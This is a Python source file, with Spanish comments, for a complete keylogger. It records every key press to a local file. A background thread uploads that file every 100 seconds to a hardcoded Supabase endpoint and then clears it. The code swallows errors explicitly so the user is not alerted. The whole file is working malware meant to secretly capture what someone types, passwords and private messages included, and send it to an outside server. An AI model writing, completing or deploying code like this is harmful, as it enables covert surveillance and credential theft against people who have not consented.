import os
import threading
import time
import keyboard
import requests

ARCHIVO_LOCAL = "data.txt"
# IMPORTANTE: Pon la dirección IP o dominio REAL de tu servidor
URL_SERVIDOR = "https://csezabwkixelyahnwasu.supabase.co/rest/v1/"
INTERVALO_ENVIO_SEGUNDOS = 100


def capturar_tecla(key):
    nombre = key.name

    # Ignorar modificadores
    if nombre in [
        "shift",
        "right shift",
        "ctrl",
        "right ctrl",
        "alt",
        "alt gr",
        "caps lock",
    ]:
        return

    with open(ARCHIVO_LOCAL, "a+", encoding="utf-8") as archivo:
        if nombre == "space":
            archivo.write(" ")
        elif nombre == "enter":
            archivo.write("\n")
        elif nombre in ["left", "right", "up", "down"]:
            flechas = {"left": "←", "right": "→", "up": "↑", "down": "↓"}
            archivo.write(flechas[nombre])
        elif nombre == "backspace":
            archivo.seek(0, 2)
            posicion = archivo.tell()
            if posicion > 0:
                archivo.seek(posicion - 1)
                archivo.truncate()
        elif len(nombre) == 1:
            archivo.write(nombre)


def servicio_envio_servidor():
    while True:
        time.sleep(INTERVALO_ENVIO_SEGUNDOS)

        if os.path.exists(ARCHIVO_LOCAL) and os.path.getsize(ARCHIVO_LOCAL) > 0:
            try:
                with open(ARCHIVO_LOCAL, "rb") as f:
                    archivos = {"file": (ARCHIVO_LOCAL, f)}
                    respuesta = requests.post(URL_SERVIDOR, files=archivos, timeout=10)

                if respuesta.status_code == 200:
                    open(ARCHIVO_LOCAL, "w").close()
            except Exception:
                pass  # Ocultar errores al usuario


# Hilo de envío constante al servidor
hilo_envio = threading.Thread(target=servicio_envio_servidor, daemon=True)
hilo_envio.start()

# Iniciar captura
keyboard.on_press(capturar_tecla)
keyboard.wait()